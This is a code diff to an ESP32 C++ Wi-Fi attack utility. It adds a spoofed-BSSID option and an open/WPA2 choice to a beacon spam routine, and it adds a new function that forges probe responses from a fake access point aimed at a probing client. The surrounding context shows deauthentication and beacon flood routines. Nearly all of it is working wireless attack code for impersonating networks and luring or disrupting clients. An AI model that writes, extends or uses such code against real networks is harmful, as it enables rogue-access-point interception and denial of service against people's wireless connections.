@@ -45,17 +45,22 @@ esp_err_t WifiAttackUtil::deauthenticate(const MacAddr bssid, const uint8_t chan
   return deauthenticate(broadcast, bssid, channel);
 }
 
-esp_err_t WifiAttackUtil::beaconSpam(const char* ssid, const uint8_t channel)
+esp_err_t WifiAttackUtil::beaconSpam(const char* ssid, const uint8_t channel, const bool wpa2, const uint8_t* srcMac)
 {
   esp_err_t res = _changeChannel(channel);
   if (res != ESP_OK) return res;
 
   const size_t ssidLen = strnlen(ssid, 32);
 
-  // Randomize MAC — force unicast (bit 0 = 0) + locally administered (bit 1 = 1)
+  // Stable BSSID if provided, else randomize — force unicast (bit 0 = 0) +
+  // locally administered (bit 1 = 1).
   uint8_t mac[6];
-  for (int j = 0; j < 6; j++) mac[j] = (uint8_t)random(0, 256);
-  mac[0] = (mac[0] & 0xFE) | 0x02;
+  if (srcMac) {
+    memcpy(mac, srcMac, 6);
+  } else {
+    for (int j = 0; j < 6; j++) mac[j] = (uint8_t)random(0, 256);
+    mac[0] = (mac[0] & 0xFE) | 0x02;
+  }
 
   // Build beacon frame dynamically so SSID IE length matches actual SSID length
   // and all subsequent IE offsets are correct regardless of SSID length.
@@ -75,7 +80,8 @@ esp_err_t WifiAttackUtil::beaconSpam(const char* ssid, const uint8_t channel)
   // Fixed parameters
   memset(&pkt[n], 0, 8); n += 8;                        // Timestamp: 0
   pkt[n++] = 0xE8; pkt[n++] = 0x03;                    // Beacon interval
-  pkt[n++] = 0x31; pkt[n++] = 0x00;                    // Capability
+  // Capability: privacy bit (0x10) set only for the WPA2 variant.
+  pkt[n++] = wpa2 ? 0x31 : 0x21; pkt[n++] = 0x00;
 
   // SSID IE — length = actual SSID byte count
   pkt[n++] = 0x00;
@@ -90,16 +96,18 @@ esp_err_t WifiAttackUtil::beaconSpam(const char* ssid, const uint8_t channel)
   // DS Parameter Set IE
   pkt[n++] = 0x03; pkt[n++] = 0x01; pkt[n++] = channel;
 
-  // RSN IE
-  pkt[n++] = 0x30; pkt[n++] = 0x18;
-  pkt[n++] = 0x01; pkt[n++] = 0x00;
-  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
-  pkt[n++] = 0x02; pkt[n++] = 0x00;
-  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
-  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
-  pkt[n++] = 0x01; pkt[n++] = 0x00;
-  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
-  pkt[n++] = 0x00; pkt[n++] = 0x00;
+  // RSN IE (WPA2-PSK / CCMP) — only for the secured variant.
+  if (wpa2) {
+    pkt[n++] = 0x30; pkt[n++] = 0x18;
+    pkt[n++] = 0x01; pkt[n++] = 0x00;
+    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
+    pkt[n++] = 0x02; pkt[n++] = 0x00;
+    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
+    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
+    pkt[n++] = 0x01; pkt[n++] = 0x00;
+    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
+    pkt[n++] = 0x00; pkt[n++] = 0x00;
+  }
 
   for (int k = 0; k < 3; k++) {
     uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
@@ -171,6 +179,77 @@ esp_err_t WifiAttackUtil::beaconFlood(const uint8_t* bssid, const char* ssid, co
   pkt[seqOff + 1] = (uint8_t)(sc >> 8);
   _sequenceNumber++;
   return _sendPacket(pkt, n);
+}
+
+esp_err_t WifiAttackUtil::probeResponse(const char* ssid, const MacAddr dst, const uint8_t channel, const bool wpa2, const uint8_t* srcMac)
+{
+  esp_err_t res = _changeChannel(channel);
+  if (res != ESP_OK) return res;
+
+  const size_t ssidLen = strnlen(ssid, 32);
+
+  // Stable fake-AP BSSID if provided, else randomized locally-administered MAC.
+  uint8_t mac[6];
+  if (srcMac) {
+    memcpy(mac, srcMac, 6);
+  } else {
+    for (int j = 0; j < 6; j++) mac[j] = (uint8_t)random(0, 256);
+    mac[0] = (mac[0] & 0xFE) | 0x02;
+  }
+
+  uint8_t pkt[128];
+  size_t  n = 0;
+
+  // MAC header — Probe Response (subtype 0x5) directed at the client
+  pkt[n++] = 0x50; pkt[n++] = 0x00;                    // Frame Control
+  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Duration
+  memcpy(&pkt[n], dst, 6); n += 6;                      // DA: probing client
+  memcpy(&pkt[n], mac, 6); n += 6;                      // SA
+  memcpy(&pkt[n], mac, 6); n += 6;                      // BSSID
+  const size_t seqOff = n;
+  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Sequence Control (per send)
+
+  // Fixed parameters
+  memset(&pkt[n], 0, 8); n += 8;                        // Timestamp
+  pkt[n++] = 0x64; pkt[n++] = 0x00;                    // Beacon interval
+  pkt[n++] = wpa2 ? 0x31 : 0x21; pkt[n++] = 0x00;      // Capability (privacy if WPA2)
+
+  // SSID IE
+  pkt[n++] = 0x00;
+  pkt[n++] = (uint8_t)ssidLen;
+  memcpy(&pkt[n], ssid, ssidLen); n += ssidLen;
+
+  // Supported Rates IE
+  pkt[n++] = 0x01; pkt[n++] = 0x08;
+  pkt[n++] = 0x82; pkt[n++] = 0x84; pkt[n++] = 0x8B; pkt[n++] = 0x96;
+  pkt[n++] = 0x24; pkt[n++] = 0x30; pkt[n++] = 0x48; pkt[n++] = 0x6C;
+
+  // DS Parameter Set IE
+  pkt[n++] = 0x03; pkt[n++] = 0x01; pkt[n++] = channel;
+
+  // RSN IE (WPA2-PSK / CCMP) — only for the secured variant.
+  if (wpa2) {
+    pkt[n++] = 0x30; pkt[n++] = 0x18;
+    pkt[n++] = 0x01; pkt[n++] = 0x00;
+    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
+    pkt[n++] = 0x02; pkt[n++] = 0x00;
+    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
+    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
+    pkt[n++] = 0x01; pkt[n++] = 0x00;
+    pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
+    pkt[n++] = 0x00; pkt[n++] = 0x00;
+  }
+
+  for (int k = 0; k < 2; k++) {
+    uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
+    pkt[seqOff]     = (uint8_t)(sc & 0xFF);
+    pkt[seqOff + 1] = (uint8_t)(sc >> 8);
+    _sequenceNumber++;
+    _sendPacket(pkt, n);
+    vTaskDelay(1 / portTICK_RATE_MS);
+  }
+
+  return ESP_OK;
 }
 
 esp_err_t WifiAttackUtil::deauthenticate(const MacAddr ap, const MacAddr bssid, const uint8_t channel)
